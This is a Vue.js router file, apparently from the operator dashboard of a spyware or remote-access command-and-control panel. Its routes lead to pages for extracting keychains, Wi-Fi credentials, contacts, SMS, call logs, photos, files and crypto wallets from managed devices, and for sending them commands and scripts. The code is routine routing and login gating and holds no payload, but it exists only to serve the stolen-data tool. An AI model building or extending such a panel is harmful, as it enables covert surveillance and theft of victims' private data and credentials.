import { createRouter, createWebHistory } from 'vue-router'
import { ElMessage } from 'element-plus'
import PATHS, { LOGIN_PAGE, DEFAULT_AFTER_LOGIN } from '../constants/paths'

function _localUser() {
  try {
    const raw = localStorage.getItem('user')
    if (!raw) return null
    return JSON.parse(raw) || null
  } catch (_) {
    return null
  }
}

function _isAdminRole(userOrRole) {
  if (!userOrRole) return false
  const r = typeof userOrRole === 'string' ? userOrRole : (userOrRole.role || userOrRole.role_name || '')
  return String(r || '').toLowerCase() === 'admin'
}

async function _fetchMeWithToken(token) {
  try {
    const res = await fetch('/api/auth/me', {
      headers: { Authorization: `Bearer ${token}` }
    })
    if (!res.ok) {
      return { ok: false, clear: true }
    }
    const data = await res.json()
    localStorage.setItem('user', JSON.stringify(data))
    return { ok: true, data }
  } catch (_) {
    return { ok: false, clear: true }
  }
}

async function _ensureAdminForRoute(token) {
  // ① 优先用 localStorage 缓存的 user，避免每次路由跳转都打 API
  const local = _localUser()
  if (local && _isAdminRole(local)) {
    return { ok: true }
  }
  // ② 没有本地缓存或不是 admin → 去服务端核实
  const fetched = await _fetchMeWithToken(token)
  if (!fetched.ok) {
    localStorage.removeItem('token')
    localStorage.removeItem('user')
    return { ok: false, needLogin: true }
  }
  if (!_isAdminRole(fetched.data)) {
    return { ok: false, needLogin: false, reason: '该页面需要管理员权限' }
  }
  return { ok: true }
}

const routes = [
  {
    path: PATHS.LOGIN,
    name: 'Login',
    component: () => import('../views/Login.vue')
  },
  {
    path: PATHS.ROOT,
    redirect: DEFAULT_AFTER_LOGIN
  },
  {
    path: PATHS.DASHBOARD,
    name: 'Dashboard',
    component: () => import('../views/Dashboard.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.DEVICES,
    name: 'Devices',
    component: () => import('../views/Devices.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.DEVICE_DETAIL,
    name: 'DeviceDetail',
    component: () => import('../views/DeviceDetail.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.CHANNELS,
    name: 'Channels',
    component: () => import('../views/Channels.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.TEMPLATES,
    name: 'Templates',
    component: () => import('../views/Templates.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.EXFIL,
    name: 'Exfil',
    component: () => import('../views/Exfil.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.EXFIL_KEYCHAIN,
    name: 'Keychain',
    component: () => import('../views/Keychain.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.EXFIL_WIFI,
    name: 'WiFi',
    component: () => import('../views/WiFi.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.EXFIL_CONTACTS,
    name: 'Contacts',
    component: () => import('../views/Contacts.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.EXFIL_SMS,
    name: 'SMS',
    component: () => import('../views/SMS.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.EXFIL_CALLS,
    name: 'Calls',
    component: () => import('../views/Calls.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.EXFIL_PHOTOS,
    name: 'Photos',
    component: () => import('../views/Photos.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.EXFIL_FILES,
    name: 'FileBrowser',
    component: () => import('../views/FileBrowser.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.WALLETS,
    name: 'Wallets',
    component: () => import('../views/Wallets.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.COMMANDS,
    name: 'Commands',
    component: () => import('../views/Commands.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.SCRIPTS,
    name: 'Scripts',
    component: () => import('../views/Scripts.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.LOGS,
    name: 'Logs',
    component: () => import('../views/Logs.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.AUDIT,
    name: 'AuditLog',
    component: () => import('../views/AuditLog.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.NOTIFICATIONS,
    name: 'Notifications',
    component: () => import('../views/Notifications.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.USERS,
    name: 'Users',
    component: () => import('../views/Users.vue'),
    meta: { requiresAuth: true, requiresAdmin: true }
  },
  {
    path: PATHS.AGENTS,
    name: 'Agents',
    component: () => import('../views/Agents.vue'),
    meta: { requiresAuth: true, requiresAdmin: true }
  },
  {
    path: PATHS.SETTINGS,
    name: 'Settings',
    component: () => import('../views/Settings.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.PROFILE,
    name: 'Profile',
    component: () => import('../views/Profile.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: PATHS.CATCH_ALL,
    redirect: DEFAULT_AFTER_LOGIN
  }
]

const router = createRouter({
  history: createWebHistory(),
  routes
})

router.beforeEach(async (to, from, next) => {
  const token = localStorage.getItem('token')

  if (to.path === LOGIN_PAGE) {
    if (token) {
      try {
        const res = await fetch('/api/auth/me', {
          headers: { Authorization: `Bearer ${token}` }
        })
        if (res.ok) {
          next(DEFAULT_AFTER_LOGIN)
          return
        }
      } catch (_) {
        localStorage.removeItem('token')
        localStorage.removeItem('user')
      }
    }
    next()
    return
  }

  if (to.meta.requiresAuth && !token) {
    next(LOGIN_PAGE)
    return
  }

  if (to.meta.requiresAdmin) {
    const res = await _ensureAdminForRoute(token)
    if (!res.ok) {
      if (res.needLogin) {
        ElMessage.warning('登录态已失效，请重新登录')
        next(LOGIN_PAGE)
      } else {
        ElMessage.error(res.reason || '您没有权限访问该页面')
        next(from.path === to.path ? DEFAULT_AFTER_LOGIN : (from.fullPath || DEFAULT_AFTER_LOGIN))
      }
      return
    }
  }

  next()
})

export default router
